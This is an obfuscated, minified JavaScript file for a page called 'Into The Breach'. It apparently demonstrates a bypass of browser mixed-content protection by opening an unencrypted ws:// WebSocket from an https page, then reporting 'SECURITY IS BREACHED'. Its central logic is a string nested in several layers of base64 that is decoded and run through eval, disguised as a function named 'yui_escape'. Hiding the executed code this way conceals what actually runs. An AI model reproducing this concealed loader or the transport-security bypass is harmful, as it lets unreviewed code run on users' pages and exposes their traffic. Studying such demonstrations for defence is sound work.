function init(){breach_init()}function breach_init(){var a=false;var A=false;var f=false;var S=false;var n=false;var Q=null;var i=null;var s=null;var U=null;var e=null;var I=null;var z=null;var E=null;var k=null;var h=null;var q=null;var x=null;var y=null;var V=0;var u="WlhaaGJDaGhkRzlpS0dGMGIySW9JbGRzYUdGaFIwcEVZVWRvYTFKNmJIQlRNR1JIVFVkSmVWTlhPVXBpUjNnd1ZGWmFhMVJyTVVobFJXaFhVbnBCTVZZeWVHdFNiVTVKVkd4b2FFMVlRbmxYYTJONFZESlNTRlZyYUd4U00wSnZWbXBLVTJReFpITlhiVGxYVFdzMVIxcEVUbk5oYkU1SlVXczFWVll6UWtoVVYzaHJZMnh3UjFwSGNFNVRSMmhhVmtaYWIxRXlSbGhTYkZaWFltMW9ZVlJVU2pSVE1XdDNWbFJXVGsxVlNsWlVWVkYzWVZWMFZHRXpRbEJrZWpBNUlpa3BLVHM9";function R(){password=document.getElementById("password");a=document.getElementById("main");A=document.getElementById("entrance");Q=document.getElementById("websocket");i=document.getElementById("message");E=document.getElementById("response_text");ws_wss=document.getElementById("ws_wss");open_close=document.getElementById("open_close");z=document.getElementById("send");reset=document.getElementById("reset");password.onkeydown=w;Q.onkeydown=g;Q.onclick=L;i.onkeydown=M;ws_wss.onclick=o;open_close.onclick=B;z.onclick=G;reset.onclick=K;K();D();c()}function o(W){if(ws_wss.value=="WS"){ws_wss.value="WSS";ws_wss.style.backgroundColor="green";open_close.style.backgroundColor="green";z.style.backgroundColor="green";Q.value="wss://echo.websocket.org"}else{ws_wss.value="WS";ws_wss.style.backgroundColor="darkblue";open_close.style.backgroundColor="darkblue";z.style.backgroundColor="darkblue";Q.value="ws://echo.websocket.org"}if(f){L(W)}reset.style.opacity=1}function B(W){if(open_close.value=="OPEN"){F()}else{L()}reset.style.opacity=1}function v(){a.style.display="block";A.style.display="none"}function w(W){if(W.keyCode==13){p("ready",password.value);password.style.backgroundColor="gray";return}password.style.backgroundColor="white"}function M(W){if(W.keyCode==13){G()}}function g(W){if(W.keyCode==13){F()}}function F(W){if(f){return}open_close.value="CLOSE";f=true;y=Q.value;m();p("open",y)}function L(W){if(!f){return}open_close.value="OPEN";p("close",null)}function G(W){if(!f){return}V++;r();p("send","#"+V+" "+i.value);z.style.opacity=0.5}function K(W){Q.value="ws://echo.websocket.org";i.value="Into The Breach";E.innerHTML="";z.style.opacity=0;reset.style.opacity=0;ws_wss.value="WS";ws_wss.style.backgroundColor="darkblue";open_close.value="OPEN";open_close.style.backgroundColor="darkblue";z.style.backgroundColor="darkblue";J();Q.value="ws://echo.websocket.org";y=Q.value;if(f){n=true;L(W)}}function l(){V=0;var W=window.location.protocol;var X=y.lastIndexOf("ws:",0);if(X==0){X="ws:"}else{X="wss:"}if(W=="https:"&&X=="ws:"){S=true;d("<font color='red'>SECURITY IS BREACHED</font>")}else{S=false;d("<font color='green'>SECURITY TEST PASSED</font>")}z.style.opacity=1;document.body.scrollTop=document.body.scrollHeight-document.body.clientHeight;d(C()+" OPENED");G()}function H(){f=false;S=false;z.style.opacity=0;if(!n){d(C()+" CLOSED")}else{n=false}J()}function T(W){z.style.opacity=1;d(C()+" REPLIED:<BR>&nbsp;&nbsp;&nbsp;<i>"+W+"</i>")}function j(){f=false;S=false;z.style.opacity=0;document.body.scrollTop=document.body.scrollHeight-document.body.clientHeight;d(C()+"<font color='red' > ERROR:<BR>&nbsp;&nbsp;&nbsp;ADDRESS REJECTED</font>")}function t(){f=false;S=false;z.style.opacity=0;document.body.scrollTop=document.body.scrollHeight-document.body.clientHeight;d("<font color='red'>THE BREACH IS<BR>NOT YET POSSIBLE<BR>IN THIS BROWSER VERSION<font>")}function O(){f=false;S=false;z.style.opacity=0;d(C()+"<font color='red'> TIMEOUT<font>")}function d(W){E.innerHTML=E.innerHTML+W+"<BR><BR>";N();J()}function r(){if(P!=null){if(window.location.protocol=="https:"){d("<font color='green'>&#x1f512; "+window.location.protocol+"</font>//"+window.location.hostname+" SENT:<BR>&nbsp;&nbsp;&nbsp;<i>#"+V+" "+i.value)+"</i>"}else{if(window.location.protocol=="http:"){d("<font color='blue' >&#x1f513; "+window.location.protocol+"</font>//"+window.location.hostname+" SENT:<BR>&nbsp;&nbsp;&nbsp;<i>#"+V+" "+i.value)+"</i>"}else{d("<font color='gray' >&#x1f513; "+window.location.protocol+"</font>//"+window.location.hostname+" SENT:<BR>&nbsp;&nbsp;&nbsp;<i>#"+V+" "+i.value)+"</i>"}}}}function m(){if(P!=null){d(C()+" OPENING")}}function C(){var W=y.split("/");if(W[0]=="ws:"&&S){return"<font color='red'>&#x1f513; "+W[0]+"</font>//"+W[2]}else{if(W[0]=="wss:"){return"<font color='green'>&#x1f512; "+W[0]+"</font>//"+W[2]}else{return"<font color='blue '>&#x1f513; "+W[0]+"</font>//"+W[2]}}}function N(){$("#responses").stop(true).animate({scrollTop:$("#response_text").height()},500);reset.style.opacity=1}function J(){if(!f){if(window.location.protocol=="https:"){responses.style.backgroundImage='url("img/idle-https.jpg")'}if(window.location.protocol=="http:"){responses.style.backgroundImage='url("img/idle-http.jpg")'}if(window.location.protocol=="file:"){responses.style.backgroundImage='url("img/idle.jpg")'}return}var W=window.location.protocol;var X=y.lastIndexOf("ws:",0);if(X==0){X="ws:"}else{X="wss:"}if(X=="ws:"&&W=="http:"){responses.style.backgroundImage='url("img/ws-http.jpg")'}if(X=="ws:"&&W=="https:"){responses.style.backgroundImage='url("img/ws-https.jpg")'}if(X=="wss:"&&W=="http:"){responses.style.backgroundImage='url("img/wss-http.jpg")'}if(X=="wss:"&&W=="https:"){responses.style.backgroundImage='url("img/wss-https.jpg")'}}function c(){var Y=["img/ws-https.jpg","img/wss-https.jpg","img/ws-http.jpg","img/wss-http.jpg","img/idle.jpg","img/idle-http.jpg","img/idle-https.jpg"];for(var X=0;X<Y.length;X++){var W=new Image();W.src=Y[X]}}var P=null;function D(){try{P=yui_escape(atob(atob(u)))}catch(W){t();return}P.port.onmessage=b;P.port.start()}function b(W){if(W.data=="ready"){v();return}if(W.data=="open"){l();return}if(W.data=="close"){H();return}if(W.data=="error"){j();return}if(W.data=="timeout"){O();return}T(W.data)}function p(Y,X){var W=new Object();W.method=Y;W.params=X;if(P!=null){P.port.postMessage(W)}else{t()}}return R()}function yui_escape(seq){return eval(seq)};